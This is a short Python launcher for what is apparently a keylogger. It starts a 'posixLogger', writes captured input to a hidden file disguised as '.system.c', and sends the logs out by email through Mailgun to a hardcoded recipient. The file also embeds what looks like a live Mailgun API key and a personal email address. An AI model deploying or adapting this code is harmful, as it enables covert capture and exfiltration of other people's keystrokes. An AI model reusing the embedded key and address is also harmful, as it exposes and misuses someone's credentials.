import os
import Logger

METHOD = 0

RECIPIENT_EMAILS = ["maxkov112211@gmail.com"] # Must be authorized by you on mailgun (Manage Authorized recipients on the control panel)
MAILGUN_API_KEY = "230bd5cd157b8432cde6f09e665a4f0b-6ae2ecad-552011c6" # Get it on http://www.mailgun.com/
MAILGUN_DOMAIN_NAME = "sandboxd7e045e2f82b4b8a885c9bb7f517527c.mailgun.org" # Get it on http://www.mailgun.com/


def main():
    deflogfile = os.getcwd() + "/.system.c"
    Lg = Logger.posixLogger(METHOD, MAILGUN_API_KEY, MAILGUN_DOMAIN_NAME, RECIPIENT_EMAILS, deflogfile)
    Lg.startLogging()

if __name__ == '__main__':
    main()






